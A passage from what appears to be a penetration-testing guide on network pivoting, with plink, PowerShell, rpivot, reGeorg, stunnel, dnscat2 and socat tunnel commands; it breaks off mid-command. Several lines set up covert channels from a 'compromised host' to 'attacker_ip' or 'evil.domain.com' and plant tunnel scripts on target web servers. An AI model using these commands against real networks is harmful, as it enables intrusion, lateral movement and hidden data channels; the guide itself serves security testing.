<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Basic SOCKS proxy establishment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -D 9050 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Local port forwarding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -L 8080:192.168.1.100:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Remote port forwarding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -R 8080:127.0.0.1:80 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Background execution with key authentication</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -i private_key.ppk -D 9050 -N user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Multiple port forwards</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -L 3389:192.168.1.101:3389 -L 445:192.168.1.102:445 user@pivot_host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Automatic login with stored session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -load &quot;pivot_session&quot; -D 9050 -N</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Connection through HTTP proxy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plink.exe -ssh -proxycmd &quot;connect.exe -H proxy:8080 %host %port&quot; user@target</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="93-powershell-based-pivoting">9.3 PowerShell-Based Pivoting<a href="#93-powershell-based-pivoting" class="hash-link" aria-label="Direct link to 9.3 PowerShell-Based Pivoting" title="Direct link to 9.3 PowerShell-Based Pivoting" translate="no">‚Äã</a></h3>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>The following PowerShell/C# code provides a framework for implementing a SOCKS5 proxy server. The actual SOCKS5 protocol logic (handling client negotiation and relaying) must be implemented by the user. This is provided for reference; a complete implementation is left as an exercise for advanced readers. For full details, refer to RFC 1928.</p></div></div>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># PowerShell port forwarding script</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">function Start-PortForward {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    param($LocalPort, $RemoteHost, $RemotePort)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $LocalPort)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    $listener.Start()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    while ($true) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $client = $listener.AcceptTcpClient()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $remote = New-Object System.Net.Sockets.TcpClient($RemoteHost, $RemotePort)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        # Relay traffic between client and remote</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Start-Job -ScriptBlock {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            param($c, $r)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            $c.GetStream().CopyTo($r.GetStream())</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        } -ArgumentList $client, $remote</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># SOCKS proxy implementation in PowerShell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$code = @&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">using System;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">using System.Net;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">using System.Net.Sockets;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">using System.Threading;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">public class SocksProxy {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    public static void Start(int port) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        TcpListener listener = new TcpListener(IPAddress.Any, port);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        listener.Start();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        while (true) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            TcpClient client = listener.AcceptTcpClient();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            Thread thread = new Thread(() =&gt; HandleClient(client));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            thread.Start();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    private static void HandleClient(TcpClient client) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // SOCKS5 protocol implementation should be inserted here.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // For full details, refer to RFC 1928.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&quot;@</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Add-Type -TypeDefinition $code</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[SocksProxy]::Start(1080)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="10-cross-platform-tunneling-solutions">10. Cross-Platform Tunneling Solutions<a href="#10-cross-platform-tunneling-solutions" class="hash-link" aria-label="Direct link to 10. Cross-Platform Tunneling Solutions" title="Direct link to 10. Cross-Platform Tunneling Solutions" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>All examples in this section assume you have downloaded or cloned the respective tool repositories (e.g., rpivot, reGeorg, stunnel, dnscat2) and fulfilled any dependencies. Substitute IP addresses, script paths, and ports to fit your scenario.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="101-rpivot-http-based-tunneling">10.1 rpivot: HTTP-Based Tunneling<a href="#101-rpivot-http-based-tunneling" class="hash-link" aria-label="Direct link to 10.1 rpivot: HTTP-Based Tunneling" title="Direct link to 10.1 rpivot: HTTP-Based Tunneling" translate="no">‚Äã</a></h3>
<p>rpivot provides HTTP/HTTPS tunneling with SOCKS proxy capabilities:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Server setup (attacker machine)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python rpivot_server.py --server-port </span><span class="token number">9999</span><span class="token plain"> --server-ip </span><span class="token number">0.0</span><span class="token plain">.0.0 --proxy-port </span><span class="token number">9050</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client connection (compromised host)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python rpivot_client.py --server-ip attacker_ip --server-port </span><span class="token number">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># HTTPS mode for encrypted tunneling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python rpivot_server.py --server-port </span><span class="token number">443</span><span class="token plain"> --server-ip </span><span class="token number">0.0</span><span class="token plain">.0.0 --proxy-port </span><span class="token number">9050</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--ssl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client with custom headers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python rpivot_client.py --server-ip attacker_ip --server-port </span><span class="token number">9999</span><span class="token plain"> --user-agent </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Mozilla/5.0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client through HTTP proxy</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python rpivot_client.py --server-ip attacker_ip --server-port </span><span class="token number">9999</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--proxy</span><span class="token plain"> proxy_host:8080</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="102-regeorg-web-application-tunneling">10.2 reGeorg: Web Application Tunneling<a href="#102-regeorg-web-application-tunneling" class="hash-link" aria-label="Direct link to 10.2 reGeorg: Web Application Tunneling" title="Direct link to 10.2 reGeorg: Web Application Tunneling" translate="no">‚Äã</a></h3>
<p>reGeorg creates tunnels through web application servers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Upload tunnel script to web server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># tunnel.aspx, tunnel.php, tunnel.jsp, or tunnel.py</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start reGeorg client</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python reGeorgSocksProxy.py </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-u</span><span class="token plain"> http://target/tunnel.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client with authentication</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python reGeorgSocksProxy.py </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-u</span><span class="token plain"> http://target/tunnel.php </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Cookie: PHPSESSID=abc123&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client with custom headers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python reGeorgSocksProxy.py </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-u</span><span class="token plain"> http://target/tunnel.php </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;User-Agent: Custom&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-H</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;X-Forwarded-For: 127.0.0.1&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="103-stunnel-tls-encryption-wrapper">10.3 Stunnel: TLS Encryption Wrapper<a href="#103-stunnel-tls-encryption-wrapper" class="hash-link" aria-label="Direct link to 10.3 Stunnel: TLS Encryption Wrapper" title="Direct link to 10.3 Stunnel: TLS Encryption Wrapper" translate="no">‚Äã</a></h3>
<p>Stunnel provides TLS encryption for arbitrary protocols:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Server configuration (stunnel.conf)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">https</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">accept </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">443</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connect </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cert </span><span class="token operator">=</span><span class="token plain"> /etc/stunnel/cert.pem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">key </span><span class="token operator">=</span><span class="token plain"> /etc/stunnel/key.pem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">https</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">accept </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connect </span><span class="token operator">=</span><span class="token plain"> server_ip:443</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="104-dnscat2-dns-tunneling">10.4 dnscat2: DNS Tunneling<a href="#104-dnscat2-dns-tunneling" class="hash-link" aria-label="Direct link to 10.4 dnscat2: DNS Tunneling" title="Direct link to 10.4 dnscat2: DNS Tunneling" translate="no">‚Äã</a></h3>
<p>dnscat2 provides covert communication through DNS queries:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Server setup</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ruby dnscat2.rb evil.domain.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./dnscat2 evil.domain.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Client with specific DNS server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./dnscat2 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--dns</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">server</span><span class="token operator">=</span><span class="token number">8.8</span><span class="token plain">.8.8 evil.domain.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Encrypted session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ruby dnscat2.rb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--security</span><span class="token operator">=</span><span class="token plain">open evil.domain.com</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./dnscat2 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--secret</span><span class="token operator">=</span><span class="token plain">password evil.domain.com</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="11-socat-swiss-army-knife-of-network-relays">11. Socat: Swiss Army Knife of Network Relays<a href="#11-socat-swiss-army-knife-of-network-relays" class="hash-link" aria-label="Direct link to 11. Socat: Swiss Army Knife of Network Relays" title="Direct link to 11. Socat: Swiss Army Knife of Network Relays" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Socat must be installed on both source and destination hosts. Replace port numbers, interface addresses, and file paths as needed for your environment.</p></div></div>
<p>Socat provides bidirectional data relay capabilities with extensive protocol support:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="111-basic-relay-configurations">11.1 Basic Relay Configurations<a href="#111-basic-relay-configurations" class="hash-link" aria-label="Direct link to 11.1 Basic Relay Configurations" title="Direct link to 11.1 Basic Relay Configurations" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># TCP port forwarding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork TCP:internal_server:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># UDP relay</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat UDP-LISTEN:53,fork UDP:dns_server:53</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># TCP to UDP conversion</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:53,fork UDP:dns_server:53</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Bidirectional relay with logging</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-d</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-d</span><span class="token plain"> TCP-LISTEN:8080,fork TCP:internal_server:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Relay with connection limits</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork,max-children</span><span class="token operator">=</span><span class="token number">10</span><span class="token plain"> TCP:internal_server:80</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="112-encrypted-tunneling">11.2 Encrypted Tunneling<a href="#112-encrypted-tunneling" class="hash-link" aria-label="Direct link to 11.2 Encrypted Tunneling" title="Direct link to 11.2 Encrypted Tunneling" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># SSL/TLS server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat OPENSSL-LISTEN:443,cert</span><span class="token operator">=</span><span class="token plain">server.pem,fork TCP:internal_server:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SSL/TLS client</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork OPENSSL:server:443,verify</span><span class="token operator">=</span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SSL with client certificate verification</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat OPENSSL-LISTEN:443,cert</span><span class="token operator">=</span><span class="token plain">server.pem,cafile</span><span class="token operator">=</span><span class="token plain">ca.pem,fork TCP:internal_server:80</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SSL tunnel with custom ciphers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat OPENSSL-LISTEN:443,cert</span><span class="token operator">=</span><span class="token plain">server.pem,cipher</span><span class="token operator">=</span><span class="token plain">HIGH,fork TCP:internal_server:80</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="113-advanced-socat-implementations">11.3 Advanced Socat Implementations<a href="#113-advanced-socat-implementations" class="hash-link" aria-label="Direct link to 11.3 Advanced Socat Implementations" title="Direct link to 11.3 Advanced Socat Implementations" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># HTTP proxy relay</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork PROXY:proxy_server:internal_host:80,proxyport</span><span class="token operator">=</span><span class="token number">3128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># SOCKS4 relay</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">socat TCP-LISTEN:8080,fork 